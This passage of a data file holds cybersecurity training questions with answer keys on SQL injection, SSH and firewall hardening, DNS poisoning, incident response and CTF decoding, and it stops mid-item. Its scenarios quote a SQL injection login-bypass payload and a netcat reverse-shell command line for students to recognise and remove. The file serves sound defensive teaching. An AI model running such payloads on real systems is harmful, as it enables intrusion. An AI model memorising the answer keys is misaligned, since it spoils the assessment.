			"A penetration test reveals your login page is vulnerable to SQL injection. The tester entered ' OR '1'='1 in the username field and gained access. Explain: (1) Why does this input bypass authentication? (2) What is the underlying code flaw? (3) What should the developer do to fix it, and what other controls should be layered on?",
		correctAnswer:
			"(1) The input makes the WHERE clause always true: WHERE username='' OR '1'='1'. (2) String concatenation of user input directly into SQL without parameterization. (3) Primary fix: parameterized queries/prepared statements. Layers: input validation, least-privilege DB accounts, WAF, proper error handling that doesn't expose SQL errors.",
		solutionSteps: [
			"The vulnerable code concatenates input: SELECT * FROM users WHERE username='\" + input + \"'...",
			"With ' OR '1'='1, the query becomes: WHERE username='' OR '1'='1' — always true, returns all rows",
			"Root cause: user input is concatenated into SQL — the database can't distinguish code from data",
			"Primary fix: parameterized queries — database treats input as data, never as executable SQL",
			"Defense in depth: input validation to reject SQL metacharacters (but don't rely on this alone)",
			"Defense in depth: least-privilege DB account — app user should only have SELECT on needed tables",
			"Defense in depth: WAF catches common injection patterns at the perimeter",
			"Defense in depth: error handling — never expose raw SQL errors to users; they reveal database structure",
		],
		commonMisconceptions: [
			"Thinking input validation alone prevents SQL injection — it can be bypassed with encoding tricks",
			"Confusing prepared statements with stored procedures — stored procedures can still concatenate strings internally",
			"Thinking a WAF replaces secure code — WAFs can be bypassed; fix the code first",
			"Believing ORMs automatically prevent injection — raw queries within an ORM bypass protections",
			"Not recognizing SQL injection can lead to full database compromise, not just auth bypass",
		],
		prerequisites: ["sql-basics", "web-application-architecture", "input-handling"],
		difficulty: "foundational",
	},
	{
		id: "sds-2",
		topic: "cissp-software-security",
		subtopic: "secure-sdlc",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your dev team uses Agile with 2-week sprints. Security has been 'bolted on' at the end — a pen test before each major release. The last three pen tests found critical vulnerabilities requiring emergency rework. How would you integrate security throughout the SDLC? What activities belong in each phase?",
		correctAnswer:
			"Shift left into every phase: Requirements → threat modeling and abuse cases. Design → security architecture review. Development → secure coding standards, SAST in CI/CD. Testing → DAST, SCA for dependency vulnerabilities. Deployment → IaC scanning, secrets management, hardening. Operations → monitoring, vulnerability management. This is DevSecOps — security becomes a continuous activity, not a gate.",
		solutionSteps: [
			"Current approach ('pen test at the end') is the most expensive — fix cost increases 10-100x the later you find bugs",
			"'Shift left' means moving security activities earlier in development",
			"Requirements: threat modeling (STRIDE), security requirements, abuse cases alongside user stories",
			"Design: security architecture review, apply secure design patterns (defense in depth, least privilege)",
			"Development: secure coding standards, SAST in the CI pipeline — catches vulnerabilities in source code before deployment",
			"Testing: DAST against running application, SCA to find vulnerable dependencies",
			"Deployment: IaC security scanning, container image scanning, secrets management (no hardcoded credentials)",
			"Operations: continuous monitoring, vulnerability management, patch management, incident response",
			"In Agile: security stories and tasks in sprint backlogs, not deferred to a 'security sprint'",
			"Security champion model: train a developer on each team to be the security point person",
		],
		commonMisconceptions: [
			"Thinking 'shift left' means only adding a SAST scanner — it's a cultural and process change, not just tooling",
			"Believing security slows down Agile — integrated security prevents the emergency rework that actually causes delays",
			"Skipping threat modeling because 'we don't have time' — a 1-hour threat model prevents weeks of rework",
			"Relying on a single tool instead of layering SAST + DAST + SCA + manual review",
			"Thinking pen testing is no longer needed — it validates all other controls; it's still needed, just not the only activity",
		],
		prerequisites: ["sdlc-phases", "agile-methodology", "security-testing-tools"],
		difficulty: "on-grade",
	},

	// ══════════════════════════════════════
	// ── COMPETITION: NCAE CYBER GAMES ──
	// ══════════════════════════════════════

	// ── Linux System Hardening ──
	{
		id: "ncae-lh-1",
		topic: "ncae-linux-hardening",
		subtopic: "ssh-hardening",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"You've been given a Linux server for the competition. The SSH config (/etc/ssh/sshd_config) has these settings:\n\nPermitRootLogin yes\nPasswordAuthentication yes\nPort 22\nX11Forwarding yes\nMaxAuthTries 6\n\nThe red team will be attacking within the hour. What changes do you make to harden SSH, and in what order of priority?",
		correctAnswer:
			"Priority order: (1) PermitRootLogin no — prevents direct root compromise. (2) Create a non-root user with sudo, set a strong password. (3) Change Port to a non-standard port (e.g., 2222). (4) X11Forwarding no — reduces attack surface. (5) MaxAuthTries 3 — limits brute force. (6) Consider adding AllowUsers to whitelist only your team's accounts. Then restart sshd: systemctl restart sshd.",
		solutionSteps: [
			"First priority: PermitRootLogin no — if the red team guesses the root password, they own the box instantly",
			"Before disabling root login, create a non-root user: useradd -m -s /bin/bash teamuser && passwd teamuser && usermod -aG sudo teamuser",
			"Test that the new user can SSH in and sudo before locking out root",
			"Change the port: Port 2222 — won't stop a port scan but slows automated attacks",
			"X11Forwarding no — X11 forwarding can be exploited for local privilege escalation",
			"MaxAuthTries 3 — reduces brute force window from 6 to 3 attempts per connection",
			"Optional: AllowUsers teamuser — whitelist only specific accounts that should have SSH access",
			"Apply changes: systemctl restart sshd (keep your current session open while testing!)",
		],
		commonMisconceptions: [
			"Disabling root login before creating an alternative account — you'll lock yourself out",
			"Thinking changing the port is strong security — it's obscurity, not security, but it helps against automated bots",
			"Restarting sshd and closing your session before testing — always keep one session open as a fallback",
			"Not setting PasswordAuthentication to 'no' when key-based auth is available — passwords can be brute-forced",
			"Forgetting to restart sshd after changing the config — changes don't take effect until the service reloads",
		],
		prerequisites: ["linux-basics", "ssh-fundamentals", "text-editors"],
		difficulty: "foundational",
	},
	{
		id: "ncae-lh-2",
		topic: "ncae-linux-hardening",
		subtopic: "user-audit",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"You run 'cat /etc/passwd' on your server and see these entries:\n\nroot:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/tmp:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\nguest:x:1001:1001:Guest:/home/guest:/bin/bash\nftp:x:1002:1002:FTP User:/srv/ftp:/bin/bash\n\nWhat's wrong here, and what commands would you run to fix it?",
		correctAnswer:
			"Critical issue: 'backdoor' has UID 0 — it's a root-level account likely planted by the red team. Its home directory is /tmp (suspicious). Fix: (1) userdel -r backdoor. (2) Lock the guest account: usermod -L guest or userdel guest. (3) Set FTP user to nologin shell: usermod -s /usr/sbin/nologin ftp. (4) Check for other UID 0 accounts: awk -F: '$3 == 0' /etc/passwd. (5) Check /etc/shadow for accounts with no password.",
		solutionSteps: [
			"The 'backdoor' account has UID 0 — any account with UID 0 has full root privileges regardless of username",
			"Its home is /tmp (world-writable, suspicious) and it has /bin/bash (interactive login) — this is a planted backdoor",
			"Remove it immediately: userdel -r backdoor",
			"Check if backdoor had any running processes: ps aux | grep backdoor",
			"Check for additional UID 0 accounts: awk -F: '$3 == 0' /etc/passwd — only root should have UID 0",
			"The guest account is risky in a competition — either lock it (usermod -L guest) or remove it (userdel -r guest)",
			"FTP user should not have an interactive shell: usermod -s /usr/sbin/nologin ftp",
			"Check for accounts with empty passwords: awk -F: '$2 == \"\"' /etc/shadow",
			"Review /etc/group for any unexpected group memberships, especially sudo/wheel",
		],
		commonMisconceptions: [
			"Not recognizing that UID 0 is what makes an account root — the username doesn't matter, the UID does",
			"Only checking the username 'root' instead of all accounts with UID 0",
			"Forgetting to check for running processes from the backdoor account before deleting it",
			"Not checking /etc/shadow for accounts with empty password fields — those can log in without any password",
			"Leaving the FTP user with /bin/bash — service accounts should use /usr/sbin/nologin or /bin/false",
		],
		prerequisites: ["linux-users", "passwd-file-format", "user-management-commands"],
		difficulty: "on-grade",
	},

	// ── Network Defense ──
	{
		id: "ncae-nd-1",
		topic: "ncae-network-defense",
		subtopic: "iptables-basics",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"Your team's server runs a web server (HTTP/HTTPS) and SSH. Write iptables rules that: (1) Allow incoming SSH (port 22) only from your team's subnet 10.0.1.0/24. (2) Allow incoming HTTP (80) and HTTPS (443) from anywhere. (3) Allow all established/related connections. (4) Drop everything else. Write the commands in order.",
		correctAnswer:
			"iptables -F\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT",
		solutionSteps: [
			"First, flush existing rules to start clean: iptables -F",
			"Allow established connections first (so your current SSH session doesn't drop): iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
			"Allow SSH only from your team's subnet: iptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 22 -j ACCEPT",
			"Allow HTTP from anywhere: iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
			"Allow HTTPS from anywhere: iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
			"Allow loopback traffic (many services need this): iptables -A INPUT -i lo -j ACCEPT",
			"Set default policy to DROP: iptables -P INPUT DROP",
			"Drop forwarded traffic: iptables -P FORWARD DROP",
			"Allow outbound traffic: iptables -P OUTPUT ACCEPT",
			"Save the rules so they persist: iptables-save > /etc/iptables.rules",
		],
		commonMisconceptions: [
			"Setting the DROP policy before adding ACCEPT rules — you'll lock yourself out of SSH immediately",
			"Forgetting the ESTABLISHED,RELATED rule — your own outbound connections (DNS, updates) will break",
			"Not allowing loopback (lo) traffic — many local services communicate over localhost and will fail",
			"Confusing -s (source) with -d (destination) — for incoming rules, restrict the source IP, not destination",
			"Forgetting to save rules — iptables rules are lost on reboot without explicit save",
		],
		prerequisites: ["networking-basics", "tcp-ports", "linux-command-line"],
		difficulty: "foundational",
	},
	{
		id: "ncae-nd-2",
		topic: "ncae-network-defense",
		subtopic: "dns-attack",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"During the competition, your team's DNS server suddenly starts resolving 'google.com' to 192.168.1.100 (an IP on the competition network). Users report they can't reach external sites. You check your BIND zone files and they look correct. What type of attack is this, how do you investigate, and how do you fix it?",
		correctAnswer:
			"This is DNS cache poisoning — the attacker injected forged DNS responses into your resolver's cache. Investigation: (1) Check the cache: rndc dumpdb -cache, then grep for the poisoned entry. (2) Flush the cache: rndc flush. (3) Prevention: enable DNSSEC validation, restrict recursion to trusted IPs only (allow-recursion), set 'dnssec-validation auto;' in named.conf, and consider rate-limiting queries.",
		solutionSteps: [
			"Identify the attack: correct zone files but wrong answers = the cache has been poisoned, not the authoritative data",
			"This is DNS cache poisoning — the attacker sent forged responses that the resolver cached as legitimate",
			"Investigate: dump the DNS cache to see the poisoned entries — rndc dumpdb -cache",
			"Examine the dump file (usually /var/cache/bind/named_dump.db) for suspicious entries",
			"Immediate fix: flush the entire DNS cache — rndc flush",
			"Verify resolution works again: dig google.com @localhost",
			"Prevention: restrict who can use your resolver for recursion — add 'allow-recursion { 10.0.1.0/24; localhost; };' to named.conf",
			"Enable DNSSEC validation: set 'dnssec-validation auto;' in named.conf options",
			"Consider randomizing source ports (most modern BIND does this by default) to make cache poisoning harder",
		],
		commonMisconceptions: [
			"Assuming the zone files were modified — cache poisoning affects the resolver cache, not the zone files",
			"Restarting BIND instead of just flushing the cache — a restart works but is slower and causes a service interruption",
			"Not restricting recursion — an open recursive resolver is an easy target for cache poisoning and DNS amplification attacks",
			"Thinking DNSSEC prevents all DNS attacks — it prevents cache poisoning of signed zones but doesn't help with unsigned domains",
			"Checking only /etc/hosts — while /etc/hosts could be modified by an attacker, the symptoms described point to cache poisoning",
		],
		prerequisites: ["dns-fundamentals", "bind-basics", "network-protocols"],
		difficulty: "on-grade",
	},

	// ── Service Configuration & Uptime ──
	{
		id: "ncae-su-1",
		topic: "ncae-service-uptime",
		subtopic: "web-server-recovery",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"Your team is scored on keeping Apache running and serving the correct content. The service has stopped. Running 'systemctl status apache2' shows: 'AH00526: Syntax error on line 47 of /etc/apache2/sites-enabled/000-default.conf'. What steps do you take to diagnose and fix this, and how do you prevent it during the competition?",
		correctAnswer:
			"(1) Check the config syntax: apache2ctl configtest — this pinpoints the exact error. (2) Open the file and fix line 47. (3) Before fixing, check if the red team modified it: ls -la /etc/apache2/sites-enabled/ and check timestamps. (4) Start the service: systemctl start apache2. (5) Prevention: make a backup copy of all working configs at the start (cp -r /etc/apache2 /root/apache2-backup), and set up a cron or script to monitor the service.",
		solutionSteps: [
			"Run apache2ctl configtest to see the exact syntax error (more detail than systemctl status)",
			"Open /etc/apache2/sites-enabled/000-default.conf and examine line 47",
			"Check if the red team modified the file: stat /etc/apache2/sites-enabled/000-default.conf (look at modify time)",
			"Fix the syntax error — common red team tricks: adding invalid directives, removing closing tags, inserting special characters",
			"Test the fix: apache2ctl configtest (should say 'Syntax OK')",
			"Start the service: systemctl start apache2",
			"Verify it's serving correctly: curl http://localhost",
			"Prevention: at competition start, back up all configs — cp -r /etc/apache2 /root/apache2-backup",
			"Set up monitoring: a cron job or loop that checks 'systemctl is-active apache2' and restarts if needed",
			"Consider making config files immutable during the competition: chattr +i /etc/apache2/sites-enabled/000-default.conf",
		],
		commonMisconceptions: [
			"Trying to start the service without fixing the config — it will just fail again with the same error",
			"Reinstalling Apache instead of fixing the config — you'll lose all your configuration and waste time",
			"Not checking if the red team broke it — if they did it once, they'll do it again; you need to prevent recurrence",
			"Editing the wrong file — sites-enabled often contains symlinks to sites-available; check which one to edit",
			"Not backing up configs at the start of the competition — this is the single most important prep step for service defense",
		],
		prerequisites: ["apache-basics", "linux-services", "systemctl"],
		difficulty: "foundational",
	},
	{
		id: "ncae-su-2",
		topic: "ncae-service-uptime",
		subtopic: "database-under-attack",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"Your MySQL database is a scored service. It's running extremely slowly. Running 'SHOW PROCESSLIST;' reveals hundreds of connections from IP 10.0.99.5 (a red team IP) all running 'SELECT SLEEP(30)'. Legitimate scoring checks are timing out. How do you handle this without taking the database offline?",
		correctAnswer:
			"(1) Kill the malicious connections: SELECT GROUP_CONCAT('KILL ', id SEPARATOR '; ') FROM information_schema.processlist WHERE host LIKE '10.0.99.5%'; — execute the output. (2) Block the IP at the firewall: iptables -A INPUT -s 10.0.99.5 -p tcp --dport 3306 -j DROP. (3) Set max connections per user and enable max_connect_errors. (4) If there's a MySQL user the attacker is using, revoke their access or change their password. (5) Check for other slow queries they may have planted.",
		solutionSteps: [
			"Identify the scope: SHOW PROCESSLIST; — count how many malicious connections exist",
			"Generate kill statements for all connections from the attacker IP:",
			"SELECT CONCAT('KILL ', id, ';') FROM information_schema.processlist WHERE host LIKE '10.0.99.5%';",
			"Execute all the KILL statements to terminate the sleeping connections",
			"Or use a one-liner: mysqladmin -u root processlist | grep '10.0.99.5' | awk '{print $2}' | xargs -I{} mysqladmin -u root kill {}",
			"Block the IP at the firewall immediately: iptables -I INPUT -s 10.0.99.5 -p tcp --dport 3306 -j DROP",
			"Harden MySQL: SET GLOBAL max_connections = 100; and SET GLOBAL max_connect_errors = 10;",
			"Check which MySQL user the attacker used: SELECT user, host FROM mysql.user WHERE host LIKE '%10.0.99%';",
			"If found, drop or restrict the user: DROP USER 'attacker_user'@'%';",
			"Change the root password if it's weak: ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_strong_password';",
		],
		commonMisconceptions: [
			"Restarting MySQL — this drops ALL connections including scoring checks, and the attacker will just reconnect",
			"Only killing connections without blocking the IP — the attacker will immediately re-establish hundreds of connections",
			"Blocking the IP in MySQL (host deny) but not at the firewall — the connections still reach MySQL and consume resources",
			"Not checking which MySQL user the attacker is using — they may have a valid account that needs to be revoked",
			"Ignoring the possibility of planted slow queries or triggers — check for any database objects the attacker may have created",
		],
		prerequisites: ["mysql-basics", "sql-fundamentals", "iptables-basics"],
		difficulty: "on-grade",
	},

	// ── Scripting & Automation ──
	{
		id: "ncae-sc-1",
		topic: "ncae-scripting",
		subtopic: "service-monitor",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"During the competition, you need to monitor if your scored services (SSH on port 22, HTTP on port 80, HTTPS on port 443, and MySQL on port 3306) are running. Write a bash script that checks each service every 30 seconds and prints an alert with a timestamp if any port stops responding.",
		correctAnswer:
			"#!/bin/bash\nSERVICES=(\"22:SSH\" \"80:HTTP\" \"443:HTTPS\" \"3306:MySQL\")\nwhile true; do\n  for svc in \"${SERVICES[@]}\"; do\n    port=$(echo $svc | cut -d: -f1)\n    name=$(echo $svc | cut -d: -f2)\n    if ! nc -z -w2 localhost $port 2>/dev/null; then\n      echo \"[$(date '+%H:%M:%S')] ALERT: $name (port $port) is DOWN!\"\n    fi\n  done\n  sleep 30\ndone",
		solutionSteps: [
			"Use a while true loop for continuous monitoring",
			"Define services as an array of port:name pairs for easy maintenance",
			"Use netcat (nc -z) to check if each port is listening — -z means scan only, -w2 sets a 2-second timeout",
			"Alternatively use: ss -tlnp | grep :PORT or bash's built-in /dev/tcp: echo > /dev/tcp/localhost/PORT",
			"Include a timestamp in alerts so you know exactly when a service went down",
			"sleep 30 between checks — not too frequent (wastes CPU) but frequent enough to catch outages quickly",
			"Run it in the background: nohup ./monitor.sh &, or in a tmux/screen session so it survives disconnection",
			"Enhancement: automatically restart failed services — if [ $? -ne 0 ]; then systemctl restart $name; fi",
		],
		commonMisconceptions: [
			"Using ping to check services — ping tests network connectivity, not whether a service is actually listening on a port",
			"Checking only if the process exists (ps aux | grep) — a process can be running but not accepting connections",
			"Not setting a timeout on the port check — without -w2, nc can hang for a long time on unresponsive services",
			"Running the script in the foreground of your only terminal — use tmux, screen, or background it with &",
			"Checking too frequently (every 1 second) — creates unnecessary load; every 30 seconds is plenty for scoring",
		],
		prerequisites: ["bash-basics", "loops", "netcat", "linux-services"],
		difficulty: "foundational",
	},
	{
		id: "ncae-sc-2",
		topic: "ncae-scripting",
		subtopic: "automated-defense",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"The red team keeps adding unauthorized SSH keys to /root/.ssh/authorized_keys and creating new user accounts with UID 0 (root-level). These changes happen every few minutes. Write a bash script that monitors for and automatically reverts these changes.",
		correctAnswer:
			"#!/bin/bash\nGOOD_KEYS=/root/.ssh/authorized_keys.clean\ncp /root/.ssh/authorized_keys $GOOD_KEYS\nwhile true; do\n  # Restore authorized_keys if modified\n  if ! diff -q /root/.ssh/authorized_keys $GOOD_KEYS >/dev/null 2>&1; then\n    cp $GOOD_KEYS /root/.ssh/authorized_keys\n    chmod 600 /root/.ssh/authorized_keys\n    echo \"[$(date)] Restored authorized_keys\"\n  fi\n  # Remove any non-root UID 0 accounts\n  awk -F: '$3 == 0 && $1 != \"root\"' /etc/passwd | while read line; do\n    user=$(echo $line | cut -d: -f1)\n    userdel -rf $user 2>/dev/null\n    echo \"[$(date)] Removed UID 0 account: $user\"\n  done\n  sleep 10\ndone",
		solutionSteps: [
			"First, save a known-good copy of authorized_keys: cp /root/.ssh/authorized_keys /root/.ssh/authorized_keys.clean",
			"Use diff to detect if the file has been modified since the known-good copy",
			"If modified, overwrite with the clean copy and reset permissions to 600",
			"For UID 0 detection: parse /etc/passwd for any accounts with UID 0 that aren't 'root'",
			"awk -F: '$3 == 0 && $1 != \"root\"' /etc/passwd — finds rogue root-level accounts",
			"Remove them with userdel -rf to delete the user and their files",
			"Log every action with timestamps so you can report to the competition judges",
			"Run this in a loop every 10 seconds — frequent enough to catch changes before scoring checks",
			"Make the script itself hard to kill: run it in a screen/tmux session, or set it as a systemd service",
			"Enhancement: use inotifywait (from inotify-tools) to watch files in real-time instead of polling",
		],
		commonMisconceptions: [
			"Only cleaning authorized_keys once — the red team will keep re-adding keys; you need continuous monitoring",
			"Not preserving a clean copy first — if the file is already compromised when you start, you'll be restoring bad keys",
			"Checking /etc/passwd but not /etc/shadow — an account with no password in shadow is even more dangerous",
			"Making the monitoring interval too long — 10-30 seconds is good; 5 minutes is too slow for a competition",
			"Not protecting the script itself — the red team may try to kill your defense scripts; use systemd or chattr +i",
		],
		prerequisites: ["bash-scripting", "file-comparison", "user-management", "cron-basics"],
		difficulty: "on-grade",
	},

	// ── Incident Detection & Response ──
	{
		id: "ncae-ir-1",
		topic: "ncae-incident-response",
		subtopic: "log-analysis",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"You're monitoring /var/log/auth.log during the competition and see these entries within 2 minutes:\n\nMar 15 14:22:01 server sshd[4521]: Failed password for root from 10.0.99.12 port 44231\n(... repeated 50 times ...)\nMar 15 14:23:47 server sshd[4571]: Accepted password for admin from 10.0.99.12 port 44281\nMar 15 14:23:49 server sshd[4571]: pam_unix(sshd:session): session opened for user admin\n\nWhat just happened? What do you do RIGHT NOW? List your actions in order of priority.",
		correctAnswer:
			"A brute-force attack on root failed, but the attacker successfully logged in as 'admin' — meaning admin had a weak or guessable password. Priority actions: (1) Kill the attacker's session immediately: who -u to find the PID, then kill -9 PID. (2) Change admin's password NOW: passwd admin. (3) Block the attacker IP: iptables -I INPUT -s 10.0.99.12 -j DROP. (4) Check what they've done: grep admin /var/log/auth.log, check bash_history, look for new files in /tmp. (5) Check for persistence: crontab -l -u admin, check authorized_keys.",
		solutionSteps: [
			"Read the logs: 50 failed root attempts then a successful admin login from the same IP = brute force succeeded on a weak account",
			"IMMEDIATE: find and kill the attacker's active session — who -u shows logged in users with PIDs",
			"Kill the session: kill -9 <PID> — don't be gentle, use -9 to force kill",
			"Change admin's password immediately: passwd admin — use a strong password",
			"Block the IP at the firewall: iptables -I INPUT -s 10.0.99.12 -j DROP (use -I to insert at top, not -A to append)",
			"Investigate what the attacker did while connected: check /home/admin/.bash_history, /root/.bash_history if they escalated",
			"Look for persistence mechanisms: crontab -l, check /etc/crontab, look in /etc/cron.d/",
			"Check for new files: find / -user admin -newer /var/log/auth.log -type f 2>/dev/null",
			"Check for unauthorized SSH keys: cat /home/admin/.ssh/authorized_keys and /root/.ssh/authorized_keys",
			"Verify no new UID 0 accounts: awk -F: '$3 == 0' /etc/passwd",
		],
		commonMisconceptions: [
			"Focusing on the failed root attempts instead of the successful admin login — the admin compromise is the real threat",
			"Blocking the IP first before killing the session — the attacker is already inside; kill their session first",
			"Only changing the password without checking for persistence — they may have planted backdoors that survive a password change",
			"Not checking bash_history — this tells you exactly what commands the attacker ran",
			"Assuming the attacker only compromised admin — they may have escalated to root within seconds of logging in",
		],
		prerequisites: ["log-reading", "linux-user-management", "iptables-basics"],
		difficulty: "foundational",
	},
	{
		id: "ncae-ir-2",
		topic: "ncae-incident-response",
		subtopic: "process-investigation",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"Running 'ps aux' on your server, you spot this process:\n\nnobody  12847  98.2  0.1  4520  1204 ?  R  14:30  5:22 /tmp/.x/nc -e /bin/bash 10.0.99.5 4444\n\nWhat is this process doing? What commands would you run to investigate and remediate? Be specific about the order.",
		correctAnswer:
			"This is a reverse shell — netcat (nc) is connecting back to the attacker at 10.0.99.5:4444 and piping /bin/bash to them, giving them interactive shell access. The 98.2% CPU and the hidden directory (/tmp/.x/) confirm malicious intent. Actions: (1) kill -9 12847. (2) rm -rf /tmp/.x/. (3) iptables -I OUTPUT -d 10.0.99.5 -j DROP (block outbound to attacker). (4) Check how it got there: look for cron jobs, other /tmp files, and what user 'nobody' has been doing.",
		solutionSteps: [
			"Identify the threat: 'nc -e /bin/bash 10.0.99.5 4444' is a textbook reverse shell",
			"nc (netcat) with -e /bin/bash connects to the attacker and gives them a live bash session",
			"It's running as 'nobody' from a hidden directory (/tmp/.x/) — clearly planted by the attacker",
			"IMMEDIATE: kill the process — kill -9 12847",
			"Remove the malicious files: rm -rf /tmp/.x/",
			"Block outbound connections to the attacker: iptables -I OUTPUT -d 10.0.99.5 -j DROP",
			"Check how it was started: look for cron entries — crontab -l -u nobody, grep -r '10.0.99.5' /etc/cron*",
			"Check for other reverse shells or backdoors: netstat -tlnp | grep ESTABLISHED, ps aux | grep nc",
			"Look for more hidden files: find /tmp -name '.*' -type f and find /tmp -name '.*' -type d",
			"Check if the attacker planted a systemd service: find /etc/systemd -newer /etc/hostname -type f",
		],
		commonMisconceptions: [
			"Not recognizing 'nc -e /bin/bash' as a reverse shell — this is one of the most common backdoor techniques",
			"Only killing the process without blocking outbound traffic — the cron or a respawning script will restart it",
			"Blocking only inbound from the attacker — the reverse shell is an OUTBOUND connection from your server",
			"Ignoring the hidden directory /tmp/.x/ — it likely contains other tools the attacker dropped",
			"Not checking for persistence — if a cron job restarts the shell, killing it once is useless",
		],
		prerequisites: ["linux-processes", "netcat-basics", "networking-concepts"],
		difficulty: "on-grade",
	},

	// ── CTF: Cryptography ──
	{
		id: "ncae-cc-1",
		topic: "ncae-ctf-crypto",
		subtopic: "encoding",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"During a CTF challenge, you find a file containing this string:\n\nbmNhZXtmbGFnX2ZvdW5kXzEyM30=\n\nWhat encoding is this, how do you identify it, how do you decode it, and what's the flag?",
		correctAnswer:
			"This is Base64 encoding. Indicators: the character set (a-z, A-Z, 0-9, +, /), the = padding at the end, and the string length being a multiple of 4. Decode with: echo 'bmNhZXtmbGFnX2ZvdW5kXzEyM30=' | base64 -d. The flag is: ncae{flag_found_123}.",
		solutionSteps: [
			"Recognize Base64: alphanumeric characters plus + and /, with = padding at the end",
			"The trailing '=' is a strong indicator — Base64 pads to multiples of 4 characters",
			"Decode: echo 'bmNhZXtmbGFnX2ZvdW5kXzEyM30=' | base64 -d",
			"Alternative: use Python — import base64; base64.b64decode('bmNhZXtmbGFnX2ZvdW5kXzEyM30=')",
			"Or use CyberChef (a web tool commonly used in CTFs) — paste the string and apply 'From Base64'",
			"The decoded flag is: ncae{flag_found_123}",
			"Common encoding ladder in CTFs: hex → Base64 → Base32 → URL encoding — try each when stuck",
		],
		commonMisconceptions: [
			"Confusing Base64 with encryption — Base64 is encoding (reversible, no key needed), not encryption",
			"Not recognizing the = padding — some Base64 strings don't have padding, but when present it's a dead giveaway",
			"Trying to brute force or decrypt it — always try simple encodings (Base64, hex, URL encode) before assuming crypto",
			"Forgetting that CTF flags often have a known format (ncae{...}) — look for that pattern after decoding",
			"Using the wrong tool — base64 -d on Linux, base64 -D on macOS (different flags)",
		],
		prerequisites: ["encoding-vs-encryption", "base64-concept", "command-line-basics"],
		difficulty: "foundational",
	},
	{
		id: "ncae-cc-2",
		topic: "ncae-ctf-crypto",
		subtopic: "caesar-cipher",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"You intercept this message from a CTF challenge:\n\napnr{ebgngvba_vf_abg_rapelcgvba}\n\nYou suspect it's a simple substitution cipher. What type of cipher is this, how do you identify the rotation, and what's the plaintext?",
		correctAnswer:
			"This is a ROT13 Caesar cipher (rotation of 13). You can identify it because: the format 'xxxx{...}' matches a CTF flag format, and ROT13 of 'apnr' = 'ncae' (the expected flag prefix). Decode: echo 'apnr{ebgngvba_vf_abg_rapelcgvba}' | tr 'a-zA-Z' 'n-za-mN-ZA-M'. The plaintext is: ncae{rotation_is_not_encryption}.",
		solutionSteps: [
			"Recognize the pattern: xxxx{...} looks like a CTF flag format, meaning the first part should decode to a known prefix",
			"If you know flags start with 'ncae', try to find the rotation: n→a is a shift of 13, c→p is shift of 13 — it's ROT13",
			"ROT13 is a special case of the Caesar cipher where the rotation is 13 (half the 26-letter alphabet)",
			"ROT13 is its own inverse — applying it twice returns the original text",
			"Decode with tr: echo 'apnr{ebgngvba_vf_abg_rapelcgvba}' | tr 'a-zA-Z' 'n-za-mN-ZA-M'",
			"Alternative: use Python — import codecs; codecs.decode('apnr{ebgngvba_vf_abg_rapelcgvba}', 'rot_13')",
			"The plaintext: ncae{rotation_is_not_encryption}",
			"The flag itself contains a lesson: rotation ciphers are NOT encryption — they provide zero security",
		],
		commonMisconceptions: [
			"Trying all 25 rotations manually — knowing the expected flag prefix lets you calculate the rotation instantly",
			"Thinking ROT13 is secure — it's trivially reversible and is used in CTFs to teach that encoding is not encryption",
			"Confusing Caesar cipher with more complex substitution ciphers — Caesar is a fixed rotation, not a random letter mapping",
			"Not recognizing the flag format as a clue — if you know the prefix, you can deduce the rotation algebraically",
			"Applying the rotation to non-alphabetic characters — numbers, braces, and underscores stay unchanged in a Caesar cipher",
		],
		prerequisites: ["cipher-basics", "ascii-alphabets", "command-line-tools"],
		difficulty: "on-grade",
	},

	// ── CTF: Digital Forensics ──
	{
		id: "ncae-cf-1",
		topic: "ncae-ctf-forensics",
		subtopic: "file-analysis",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"A CTF challenge gives you a file called 'image.jpg' that doesn't open in any image viewer. Running 'file image.jpg' returns: 'image.jpg: Zip archive data, at least v2.0 to extract'. What happened here, and what steps do you take to extract and analyze the contents?",
		correctAnswer:
			"The file extension is misleading — it's actually a ZIP archive, not a JPEG. The 'file' command checks the magic bytes (file header), not the extension. Steps: (1) Rename it: mv image.jpg image.zip. (2) Extract: unzip image.zip. (3) Examine contents: ls -la the extracted files. (4) Run 'file' on each extracted file to check for more misdirection. (5) Look for flag files, hidden files (ls -la), and use strings/grep to search for flag patterns.",
		solutionSteps: [
			"The 'file' command reads the magic bytes (first bytes of the file) to determine the true file type",
			"JPEG files start with FF D8 FF, ZIP files start with PK (50 4B) — the file command detected ZIP magic bytes",
			"Don't trust file extensions — they're just labels and can be changed to anything",
			"Rename and extract: mv image.jpg image.zip && unzip image.zip",
			"Or skip renaming: unzip image.jpg (unzip doesn't care about the extension)",
			"List extracted contents with ls -la (the -a flag shows hidden files starting with .)",
			"Run 'file' on each extracted file — there may be more layers of misdirection",
			"Search for flags: grep -r 'ncae{' . (recursively search all files for the flag format)",
			"Use 'strings' on any binary files: strings extracted_file | grep ncae",
			"Check for steganography: if there IS a real image, the flag might be hidden inside it (use steghide, exiftool, or binwalk)",
		],
		commonMisconceptions: [
